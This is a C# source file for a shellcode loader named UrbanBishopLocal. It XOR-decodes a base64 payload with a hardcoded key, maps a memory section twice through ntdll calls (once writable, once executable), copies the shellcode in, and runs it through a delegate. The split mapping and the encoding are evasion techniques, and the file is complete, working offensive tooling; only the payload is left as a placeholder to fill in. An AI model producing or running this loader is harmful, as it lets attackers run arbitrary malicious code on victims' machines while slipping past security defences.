using System;
using System.Runtime.InteropServices;

namespace UrbanBishopLocal
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct SECT_DATA
        {
            public Boolean isvalid;
            public IntPtr hSection;
            public IntPtr pBase;
        }

        [DllImport("ntdll.dll")]
        public static extern UInt32 NtCreateSection(
            ref IntPtr section,
            UInt32 desiredAccess,
            IntPtr pAttrs,
            ref long MaxSize,
            uint pageProt,
            uint allocationAttribs,
            IntPtr hFile);

        [DllImport("ntdll.dll")]
        public static extern UInt32 NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            IntPtr CommitSize,
            ref long SectionOffset,
            ref long ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect);


        public static SECT_DATA MapLocalSectionAndWrite(byte[] ShellCode)
        {
            SECT_DATA SectData = new SECT_DATA();
            long ScSize = ShellCode.Length;
            long MaxSize = ScSize;
            IntPtr hSection = IntPtr.Zero;
            UInt32 CallResult = NtCreateSection(ref hSection, 0xe, IntPtr.Zero, ref MaxSize, 0x40, 0x8000000, IntPtr.Zero);
            if (CallResult == 0 && hSection != IntPtr.Zero)
            {
                Console.WriteLine("    |-> hSection: 0x" + String.Format("{0:X}", (hSection).ToInt64()));
                Console.WriteLine("    |-> Size: " + ScSize);
                SectData.hSection = hSection;
            }
            else
            {
                Console.WriteLine("[!] Failed to create section..");
                SectData.isvalid = false;
                return SectData;
            }

            // Allocate RW portion + Copy ShellCode
            IntPtr pScBase = IntPtr.Zero;
            long lSecOffset = 0;
            CallResult = NtMapViewOfSection(hSection, (IntPtr)(-1), ref pScBase, IntPtr.Zero, IntPtr.Zero, ref lSecOffset, ref MaxSize, 0x2, 0, 0x4);
            if (CallResult == 0 && pScBase != IntPtr.Zero)
            {
                Console.WriteLine("\n[>] Creating first view with PAGE_READWRITE");
                Console.WriteLine("    |-> pBase: 0x" + String.Format("{0:X}", (pScBase).ToInt64()));
                SectData.pBase = pScBase;
            }
            else
            {
                Console.WriteLine("[!] Failed to map section locally..");
                SectData.isvalid = false;
                return SectData;
            }
            Marshal.Copy(ShellCode, 0, SectData.pBase, ShellCode.Length);

            // Allocate ER portion
            IntPtr pScBase2 = IntPtr.Zero;
            CallResult = NtMapViewOfSection(hSection, (IntPtr)(-1), ref pScBase2, IntPtr.Zero, IntPtr.Zero, ref lSecOffset, ref MaxSize, 0x2, 0, 0x20);
            if (CallResult == 0 && pScBase != IntPtr.Zero)
            {
                Console.WriteLine("\n[>] Creating second view with PAGE_EXECUTE_READ");
                Console.WriteLine("    |-> pBase: 0x" + String.Format("{0:X}", (pScBase2).ToInt64()));
                SectData.pBase = pScBase2;
            }
            else
            {
                Console.WriteLine("[!] Failed to map section locally..");
                SectData.isvalid = false;
                return SectData;
            }

            SectData.isvalid = true;
            return SectData;
        }

        [UnmanagedFunctionPointerAttribute(CallingConvention.Cdecl)]
        private delegate Int32 Initialize();

        static void Runner(byte[] data)
        {
            char[] key = { 'S', 'k', 'a', 't', 'e', 'r', 'B', 'o', 'y' };

            byte[] ShellCode = new byte[data.Length];

            int j = 0;

            for (int i = 0; i < data.Length; i++)
            {
                if (j == key.Length)
                {
                    j = 0;
                }
                ShellCode[i] = (byte)(data[i] ^ Convert.ToByte(key[j]));
                j++;
            }

            // Create local section, map two views RW + RX, copy shellcode to RW
            Console.WriteLine("\n[>] Creating local section..");
            SECT_DATA LocalSect = MapLocalSectionAndWrite(ShellCode);
            if (!LocalSect.isvalid)
            {
                return;
            }

            Console.WriteLine("\n[>] Triggering shellcode using delegate!");
            Initialize del = (Initialize)Marshal.GetDelegateForFunctionPointer(LocalSect.pBase, typeof(Initialize));
            del();

            return;
        }
        static void Main(string[] args)
        {
            Runner(Convert.FromBase64String(@"REPLACE_ME_WITH_B64_SHELLCODE"));
        }
    }
}
